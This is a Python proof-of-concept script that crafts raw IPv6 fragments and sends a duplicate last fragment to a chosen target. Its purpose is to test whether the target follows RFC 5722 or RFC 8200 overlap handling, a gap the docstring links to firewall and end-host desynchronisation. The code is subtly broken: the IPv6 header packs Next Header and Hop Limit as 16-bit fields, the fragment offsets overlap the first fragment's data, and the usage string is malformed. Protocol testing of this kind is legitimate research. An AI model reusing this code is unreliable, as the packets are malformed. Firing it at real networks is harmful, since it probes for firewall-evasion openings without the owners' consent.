#!/usr/bin/env python3
"""
Proof-of-Concept: Fragment Reassembly Ambiguity in Overlap Handling

This script demonstrates the ambiguity described in RFC 8200 Section 4.5 and RFC 5722 Section 4.
RFC 5722 mandates that overlapping fragments MUST cause the entire datagram to be silently discarded.
However, RFC 8200 allows implementations to detect exact duplicate fragments and drop only the duplicate,
keeping the rest of the packet for reassembly.

This PoC sends a valid first fragment, followed by two identical copies of the second fragment.
- A strict RFC 5722 implementation (or one treating duplicates as overlaps) will drop the entire packet.
- An implementation following the RFC 8200 allowance may drop the duplicate and successfully reassemble the packet.

This discrepancy can lead to desynchronization between a firewall (which may drop the packet) and the end-host
(which may accept it), or vice-versa, depending on their respective implementations.
"""

import struct
import socket
import sys
import os
import random
import time

# Helper function to calculate IPv6 header checksum is not needed as IPv6 doesn't have one.
# We will construct packets manually using struct.

def create_ipv6_header(src_addr, dst_addr, payload_len, next_header, hop_limit=64):
    """
    Constructs an IPv6 header.
    Format:
    - Version (4 bits) + Traffic Class (8 bits) + Flow Label (20 bits) -> 32 bits
    - Payload Length (16 bits)
    - Next Header (8 bits)
    - Hop Limit (8 bits)
    - Source Address (128 bits)
    - Destination Address (128 bits)
    """
    version = 6
    traffic_class = 0
    flow_label = 0
    
    # Pack the first 32 bits
    first_32 = (version << 28) | (traffic_class << 20) | flow_label
    
    # Pack the rest
    header = struct.pack('!IHHH', first_32, payload_len, next_header, hop_limit)
    header += socket.inet_pton(socket.AF_INET6, src_addr)
    header += socket.inet_pton(socket.AF_INET6, dst_addr)
    
    return header

def create_fragment_header(next_header, frag_offset, m_flag, identification):
    """
    Constructs an IPv6 Fragment Header.
    Format:
    - Next Header (8 bits)
    - Reserved (8 bits)
    - Fragment Offset (13 bits) + Res (2 bits) + M flag (1 bit) -> 16 bits
    - Identification (32 bits)
    """
    # Fragment Offset is in 8-octet units. We shift left by 3 bits to get the actual byte offset,
    # but the field itself stores the 8-octet unit value. The M flag is the last bit.
    # The 16-bit field is: [Fragment Offset (13 bits)][Res (2 bits)][M (1 bit)]
    frag_field = (frag_offset << 3) | (0 << 2) | m_flag
    
    header = struct.pack('!BBHI', next_header, 0, frag_field, identification)
    return header

def create_udp_payload(data):
    """
    Constructs a simple UDP payload for demonstration.
    We'll use a dummy UDP header to make the packet look like a valid application layer packet.
    """
    src_port = 12345
    dst_port = 8080
    length = 8 + len(data)  # UDP header (8 bytes) + data
    checksum = 0  # UDP checksum is optional in IPv6, we can set it to 0
    
    udp_header = struct.pack('!HHHH', src_port, dst_port, length, checksum)
    return udp_header + data

def send_fragment(sock, src_addr, dst_addr, frag_id, frag_offset, m_flag, payload_data, next_header_upper=17):
    """
    Constructs and sends an IPv6 fragment packet.
    """
    # Calculate payload length for IPv6 header (Fragment Header + Upper Layer Headers + Data)
    frag_header_len = 8
    upper_layer_len = len(payload_data)
    ipv6_payload_len = frag_header_len + upper_layer_len
    
    # Create IPv6 Header
    ipv6_header = create_ipv6_header(src_addr, dst_addr, ipv6_payload_len, 44)  # 44 is Fragment Header
    
    # Create Fragment Header
    # The Next Header in the Fragment Header points to the upper layer protocol (e.g., UDP=17)
    frag_header = create_fragment_header(next_header_upper, frag_offset, m_flag, frag_id)
    
    # Combine headers and payload
    packet = ipv6_header + frag_header + payload_data
    
    # Send the packet
    try:
        sock.sendto(packet, (dst_addr, 0, 0, 0))
        print(f"[+] Sent Fragment: ID={frag_id:#010x}, Offset={frag_offset}, M={m_flag}, Len={len(payload_data)}")
    except Exception as e:
        print(f"[-] Error sending fragment: {e}")

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <TARGET_IPV6>")
        print("Example: {sys.argv[0]} 2001:db8::1")
        sys.exit(1)
    
    target_ipv6 = sys.argv[1]
    src_ipv6 = "::1"  # Using loopback for simplicity, change if testing remotely
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[-] This script requires root privileges to send raw packets.")
        sys.exit(1)
    
    # Create raw socket
    try:
        sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_IPV6)
    except Exception as e:
        print(f"[-] Failed to create socket: {e}")
        sys.exit(1)
    
    # Generate a random Fragment Identification
    frag_id = random.randint(1, 0xFFFFFFFF)
    print(f"[*] Using Fragment ID: {frag_id:#010x}")
    
    # Define payload data
    # We'll split a simple message into two fragments
    full_message = b"VULNERABILITY_DEMO_DATA_1234567890"
    
    # Fragment 1: First 8 bytes of data (Offset 0, M=1)
    frag1_data = create_udp_payload(full_message[:8])
    
    # Fragment 2: Next 8 bytes of data (Offset 1, M=0)
    frag2_data = create_udp_payload(full_message[8:16])
    
    print("[*] Sending Fragment 1 (First Fragment)...")
    send_fragment(sock, src_ipv6, target_ipv6, frag_id, 0, 1, frag1_data)
    
    # Small delay to ensure ordering
    time.sleep(0.1)
    
    print("[*] Sending Fragment 2 (Last Fragment)...")
    send_fragment(sock, src_ipv6, target_ipv6, frag_id, 1, 0, frag2_data)
    
    # Small delay
    time.sleep(0.1)
    
    print("[*] Sending Duplicate of Fragment 2 (Exact Duplicate)...")
    # This is the key part of the PoC. We send an exact duplicate of the last fragment.
    # According to RFC 5722, this is an overlapping fragment and the whole packet should be dropped.
    # According to RFC 8200, the implementation may choose to drop only the duplicate and keep the packet.
    send_fragment(sock, src_ipv6, target_ipv6, frag_id, 1, 0, frag2_data)
    
    print("[*] Packet injection complete.")
    print("[*] Observe the target's behavior:")
    print("    - If the target drops the entire packet, it follows strict RFC 5722 overlap handling.")
    print("    - If the target reassembles and processes the packet, it follows the RFC 8200 duplicate allowance.")
    print("[*] Check firewall logs and end-host application logs for discrepancies.")
    
    sock.close()

if __name__ == "__main__":
    main()
